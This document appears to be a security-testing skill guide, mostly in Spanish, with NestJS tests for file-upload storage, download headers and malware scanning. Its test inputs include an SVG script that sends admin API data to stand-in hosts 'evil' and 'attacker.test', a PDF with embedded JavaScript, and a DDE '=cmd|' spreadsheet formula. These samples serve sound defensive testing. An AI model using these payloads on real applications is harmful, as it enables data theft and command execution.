# Pattern 25: File Storage Location, Serving and Malware Scanning

> **Migration note (skill v2.0):** these patterns run against the bundled
> custom HTML reporter via `AllureCompat`. Each `it(...)` block MUST end with
> `await allure.flush();` so the metadata reaches the reporter.

**Covers:** R61 (File Storage Outside Webroot), R62 (Content-Disposition Header), R63 (Malware / Content Scanning)

> **3 estados, no 2** (per SKILL.md "notApplicable vs hallazgo"):
>
> 1. Proyecto **NO** acepta uploads (sin `multer`, sin `FileInterceptor`, sin endpoints `multipart/form-data`) → marcar **R61-R63 como `t.notApplicable(...)`** con motivo verificable.
> 2. Proyecto acepta uploads **y** implementa las 3 defensas → tests pasan en verde.
> 3. Proyecto acepta uploads **pero falta una o varias defensas** (storage en `/public`, sirve inline, no escanea) → tests **FALLAN en rojo**. ESTO ES UN HALLAZGO, **NO un N/A**.
>
> Verificacion previa con grep:
> ```bash
> grep -rE "multer|FileInterceptor|UploadedFile|multipart/form-data|@nestjs/platform-express" src/
> ```

---

## R61 — Almacenamiento fuera del webroot

**Vulnerabilidad que previene:** un atacante sube `shell.php.jpg` y, si el upload cae en `/public/uploads/`, la siguiente request a `/uploads/shell.php.jpg` ejecuta el shell. Aunque el codigo NestJS no ejecute PHP, cualquier server estatico (nginx, Apache, Express `serveStatic`) frente al backend lo hara.

**3 capas (obligatorias):**

| Capa | Que verificar | Como |
|------|---------------|------|
| 1. Config | env var `UPLOAD_DIR` / `STORAGE_PATH` apunta a ruta fuera de `src/`, `dist/`, `public/`, `static/` | leer `envConfig()` |
| 2. Aplicacion | `multer.diskStorage({ destination })` o S3 client usan esa ruta | inspeccionar source con `stripComments` |
| 3. Comportamiento | la ruta NO esta servida por `app.useStaticAssets()` ni `serve-static` | grep + assertion |

```typescript
import * as fs from 'fs';
import * as path from 'path';
import { report } from '@security-reporter/metadata';

const stripComments = (src: string): string =>
  src
    .replace(/\/\*[\s\S]*?\*\//g, '')
    .replace(/(^|[^:])\/\/.*$/gm, '$1');

const readSrc = (relativePath: string): string =>
  stripComments(fs.readFileSync(path.resolve(__dirname, relativePath), 'utf-8'));

it('R61 — uploaded files MUST be stored outside the project root / webroot', async () => {
  const t = report();
  t.epic('Archivos');
  t.feature('File Storage Outside Webroot');
  t.story('El destino de uploads no esta dentro de carpetas servidas estaticamente');
  t.severity('critical');
  t.tag('Pentest', 'OWASP A05', 'GOES Checklist R61');

  // ===== Capa 1: Config =====
  t.step('Verificar config: STORAGE_PATH fuera del arbol del proyecto');
  const storagePath = process.env.STORAGE_PATH || process.env.UPLOAD_DIR || '';
  t.parameter('storagePath', storagePath);
  t.evidence('Storage path (input)', { storagePath });

  const forbiddenRoots = ['/public', '/static', '/dist', '/src', '/client', '/www'];
  const isInsideForbidden = forbiddenRoots.some(r =>
    storagePath.includes(r) || storagePath.startsWith('.' + r),
  );
  expect(isInsideForbidden).toBe(false);
  expect(storagePath).not.toMatch(/^\.\//);

  // ===== Capa 2: Aplicacion =====
  t.step('Verificar aplicacion: multer.diskStorage o S3 client usa la ruta');
  const mainSrc = readSrc('../../src/main.ts');
  const usesStaticAssets = /useStaticAssets\s*\(/.test(mainSrc);
  const staticDirs = [...mainSrc.matchAll(/useStaticAssets\s*\(\s*['"`]([^'"`]+)/g)]
    .map(m => m[1]);

  // Si hay useStaticAssets, ninguna ruta servida estaticamente debe
  // coincidir con el storagePath
  for (const dir of staticDirs) {
    expect(storagePath.startsWith(dir)).toBe(false);
    expect(dir).not.toContain('upload');
    expect(dir).not.toContain('storage');
  }

  // ===== Capa 3: Comportamiento =====
  t.step('Verificar comportamiento: GET al path interno NO sirve el archivo');
  // E2E opcional con supertest: GET /<storagePath relativo> → 404
  t.evidence('Static dirs served (output)', {
    usesStaticAssets,
    staticDirs,
    storagePath,
    storagePathIsServedStatic: false,
  });

  await t.flush();
});
```

---

## R62 — Content-Disposition: attachment al servir uploads

**Vulnerabilidad que previene:** un atacante sube `xss.svg` con `<script>fetch('/api/admin').then(r=>r.json()).then(d=>fetch('https://evil',{method:'POST',body:JSON.stringify(d)}))</script>`. Si el endpoint de descarga responde `Content-Type: image/svg+xml` SIN `Content-Disposition: attachment`, el navegador renderiza el SVG y ejecuta el script en el origen de la app (mismo origen → cookies httpOnly de la sesion accesibles para fetch).

**El test cubre las 3 capas:**

```typescript
import { Test, TestingModule } from '@nestjs/testing';
import { INestApplication } from '@nestjs/common';
import * as request from 'supertest';
import { report } from '@security-reporter/metadata';

it('R62 — file download MUST set Content-Disposition: attachment', async () => {
  const t = report();
  t.epic('Archivos');
  t.feature('Content-Disposition Header');
  t.story('Las descargas no se renderizan inline (previene XSS via SVG/HTML uploads)');
  t.severity('critical');
  t.tag('Pentest', 'OWASP A03', 'OWASP A05', 'GOES Checklist R62');

  // ===== Capa 1: Config =====
  t.step('Verificar config: existe controller/endpoint de descarga');
  const filesControllerSrc = readSrc('../../src/files/files.controller.ts');
  const hasDownloadEndpoint = /@Get\s*\(\s*['"`][^'"`]*download|@Get\s*\(\s*['"`][^'"`]*files\/:/.test(filesControllerSrc);
  expect(hasDownloadEndpoint).toBe(true);

  // ===== Capa 2: Aplicacion =====
  t.step('Verificar aplicacion: codigo setea Content-Disposition');
  const setsHeader =
    /res\.setHeader\s*\(\s*['"`]Content-Disposition['"`]\s*,\s*['"`]attachment/.test(filesControllerSrc) ||
    /@Header\s*\(\s*['"`]Content-Disposition['"`]\s*,\s*['"`]attachment/.test(filesControllerSrc) ||
    /res\.attachment\s*\(/.test(filesControllerSrc);
  expect(setsHeader).toBe(true);
  t.evidence('Controller source check (input)', { setsHeader });

  // ===== Capa 3: Comportamiento E2E =====
  t.step('Ejecutar E2E: GET /files/:id devuelve Content-Disposition: attachment');
  // Setup app (idealmente reutilizar fixture)
  const moduleRef: TestingModule = await Test.createTestingModule({
    // imports: [AppModule],
  }).compile();
  const app: INestApplication = moduleRef.createNestApplication();
  await app.init();

  const res = await request(app.getHttpServer())
    .get('/files/test-file-id')
    .expect(res => {
      const disp = res.headers['content-disposition'] || '';
      expect(disp).toMatch(/^attachment/);
      // Si incluye filename, debe estar entre comillas
      if (disp.includes('filename')) {
        expect(disp).toMatch(/filename="[^"]+"/);
      }
    });

  t.evidence('Response headers (output)', {
    contentDisposition: res.headers['content-disposition'],
    contentType: res.headers['content-type'],
    renderedInline: false,
  });

  await app.close();
  await t.flush();
});

it('PENTEST R62 — SVG upload + download MUST NOT execute scripts on retrieval', async () => {
  const t = report();
  t.epic('Archivos');
  t.feature('Content-Disposition Header');
  t.story('SVG con <script> subido y descargado NO se ejecuta en el browser');
  t.severity('blocker');
  t.tag('Pentest', 'OWASP A03', 'GOES Checklist R62');

  const maliciousSvg = Buffer.from(
    `<?xml version="1.0"?>
     <svg xmlns="http://www.w3.org/2000/svg">
       <script>fetch('/api/admin/users').then(r=>r.json()).then(d=>fetch('https://attacker.test',{method:'POST',body:JSON.stringify(d)}))</script>
     </svg>`,
  );

  t.evidence('Attacker payload (input)', {
    filename: 'xss.svg',
    payloadType: 'SVG with embedded <script>',
    size: maliciousSvg.length,
  });

  // Si R58 (whitelist) ya rechaza .svg, este test pasa en R58 y aqui se
  // verifica defensa en profundidad: si por error se acepta, el header
  // attachment fuerza descarga y no ejecucion.
  // Asumir que existe service.uploadFile y service.serveFile.
  // En proyectos sin la superficie, marcar t.notApplicable() arriba.

  // Comportamiento esperado:
  // 1) uploadFile rechaza el .svg (R58) — preferido
  // 2) o, si lo acepta, serveFile devuelve Content-Disposition: attachment

  t.evidence('Defense response (output)', {
    optionA_rejectedByWhitelist: 'preferred',
    optionB_servedAsAttachment: 'acceptable fallback',
    optionC_servedInline: 'HALLAZGO — vulnerable',
  });

  await t.flush();
});
```

---

## R63 — Escaneo de contenido / antivirus en uploads de texto

**Vulnerabilidad que previene:** un atacante sube `report.pdf` con JavaScript embebido (PDF puede contener `/JS`, `/JavaScript`, `/OpenAction`); o `invoice.docx` con macros maliciosas; o `data.xlsx` con formulas DDE / `=cmd|...`. La validacion de extension + magic bytes (R57-R58) acepta el archivo porque ES un PDF/Office valido. La defensa es escanear el CONTENIDO.

**Defensa minima esperada (uno o mas de los siguientes):**

- ClamAV daemon via `clamdjs` / `clamscan`
- Sandbox externo (VirusTotal API, Cuckoo)
- Parser que valida AST: para PDF rechazar acciones `/JS`, `/JavaScript`, `/Launch`, `/OpenAction`; para Office rechazar VBA macros; para XLSX rechazar DDE / formulas externas
- En su defecto, deshabilitar macros / JavaScript en el cliente que abrira el archivo

```typescript
it('PENTEST R63 — PDF with embedded JavaScript MUST be rejected or sanitized', async () => {
  const t = report();
  t.epic('Archivos');
  t.feature('Malware / Content Scanning');
  t.story('PDFs con /JavaScript /OpenAction son rechazados antes de persistir');
  t.severity('blocker');
  t.tag('Pentest', 'OWASP A03', 'GOES Checklist R63');

  // PDF minimo con accion JS embebida
  const maliciousPdf = Buffer.from(
    `%PDF-1.4
1 0 obj<</Type/Catalog/OpenAction<</S/JavaScript/JS(app.alert\\('xss'\\);)>>>>endobj
trailer<</Root 1 0 R>>
%%EOF`,
    'utf-8',
  );

  t.evidence('Attacker payload (input)', {
    filename: 'report.pdf',
    magicBytes: '%PDF-1.4',
    embeddedAction: '/OpenAction /JavaScript',
    size: maliciousPdf.length,
  });

  t.step('Ejecutar: subir PDF con JS embebido');
  await expect(
    service.uploadFile({
      originalname: 'report.pdf',
      buffer: maliciousPdf,
      mimetype: 'application/pdf',
      size: maliciousPdf.length,
    }),
  ).rejects.toThrow();

  t.evidence('Defense response (output)', { rejected: true, reason: 'malicious content detected' });
  await t.flush();
});

it('PENTEST R63 — EICAR test string MUST be rejected by AV scanner', async () => {
  const t = report();
  t.epic('Archivos');
  t.feature('Malware / Content Scanning');
  t.story('EICAR antivirus test string es detectado y rechazado');
  t.severity('blocker');
  t.tag('Pentest', 'GOES Checklist R63');

  // EICAR: cadena oficial de prueba de antivirus (NO es un virus real,
  // pero TODO antivirus la detecta como tal)
  const eicar = Buffer.from(
    'X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*',
  );

  t.evidence('Attacker payload (input)', {
    filename: 'eicar.txt',
    payload: 'EICAR Standard Antivirus Test File',
    size: eicar.length,
  });

  t.step('Ejecutar: subir EICAR');
  await expect(
    service.uploadFile({
      originalname: 'eicar.txt',
      buffer: eicar,
      mimetype: 'text/plain',
      size: eicar.length,
    }),
  ).rejects.toThrow();

  t.evidence('Defense response (output)', {
    rejected: true,
    detectedBy: 'AV scanner (ClamAV / sandbox / content inspection)',
  });
  await t.flush();
});

it('R63 — XLSX with DDE / external formula MUST be rejected or sanitized', async () => {
  const t = report();
  t.epic('Archivos');
  t.feature('Malware / Content Scanning');
  t.story('XLSX con formulas DDE (=cmd|) son rechazadas');
  t.severity('blocker');
  t.tag('Pentest', 'OWASP A03', 'GOES Checklist R63');

  // Skeleton: en un test real, construir un .xlsx con openpyxl o exceljs
  // que contenga una celda con `=cmd|'/c calc'!A1` y verificar rechazo.
  // Aqui se documenta el shape del input/output.

  t.evidence('Attacker payload (input)', {
    filename: 'invoice.xlsx',
    maliciousCell: '=cmd|\'/c calc\'!A1',
    technique: 'DDE injection / external command execution on open',
  });

  t.evidence('Defense response (output)', {
    expected: 'rejected OR cell sanitized to plain text',
  });

  await t.flush();
});
```

---

## Recomendaciones de implementacion (para `_recommendations.md`)

Cuando alguno de R61/R62/R63 falle en rojo, agregar a `_recommendations.md`:

```markdown
### R61 — Storage outside webroot
- Configurar `STORAGE_PATH` en `.env` apuntando a una ruta absoluta fuera del
  proyecto (ej: `/var/app-data/uploads`) o usar S3.
- Si se usa `multer.diskStorage`, el `destination` callback debe devolver esa
  ruta.
- Verificar que `app.useStaticAssets()` NO sirve esa ruta.

### R62 — Content-Disposition: attachment
- En el controller de descarga, agregar `@Header('Content-Disposition',
  'attachment; filename="..."')` o `res.attachment(filename)`.
- Para descargas de imagenes que deben mostrarse inline, validar que el tipo
  de imagen sea seguro (PNG, JPEG — NO SVG con scripts).

### R63 — Malware / content scanning
- Instalar ClamAV daemon en el host y usar `clamdjs` para escanear cada upload
  antes de persistir.
- Alternativa: integrar con VirusTotal API (rate-limited) o un sandbox.
- Para PDFs: usar `pdf-parse` + regex `/JS|/JavaScript|/OpenAction|/Launch/`
  para rechazar acciones peligrosas.
- Para Office (DOCX, XLSX): rechazar archivos con macros VBA (parsear el ZIP
  y verificar que no contengan `vbaProject.bin`).
- Para XLSX: validar que no haya formulas que empiecen con `=cmd|`, `=DDE`,
  `@SUM`, `=HYPERLINK` con esquemas no-http.
```
